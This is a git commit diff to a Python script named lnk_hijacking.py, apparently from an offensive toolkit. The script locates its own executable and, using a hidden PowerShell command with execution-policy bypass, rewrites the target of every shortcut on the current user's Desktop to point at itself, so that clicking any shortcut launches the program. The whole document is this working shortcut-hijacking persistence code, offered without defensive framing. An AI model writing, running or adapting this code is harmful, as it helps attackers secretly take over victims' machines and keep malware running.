080f0c90e94a7f007a54d71f9ffd29b067dabe1f
Ph3nX-Z <66122220+Ph3nX-Z@users.noreply.github.com>
2021-10-17 22:38:02 +0200

    Update lnk_hijacking.py

--- commands_templates/lnk_hijacking.py
+++ commands_templates/lnk_hijacking.py
@@ -2,12 +2,19 @@ import os
 import glob
 
 user = os.getlogin()
-path = __file__
+path = os.getcwd()
+path2 = __file__
 
-print(user,path)
+if "\\" in path2:
+    path_f = path2
+else:
+    path_f = path+"\\"+path2
+    path_f = path_f[:-3]+".exe"
+
 
 pwsh_command = lambda dest,file: f"powershell.exe -WindowStyle Hidden -exec bypass -C $shell = New-Object -COM WScript.Shell;$shortcut = $shell.CreateShortcut('{dest}');$shortcut.TargetPath = '{file}';$shortcut.Save()"
 
 
+
 for i in glob.glob(f"C:\\Users\\{user}\\Desktop\\*.lnk"):
-    os.system(pwsh_command(i,path))
+    os.system(pwsh_command(i,path_f))
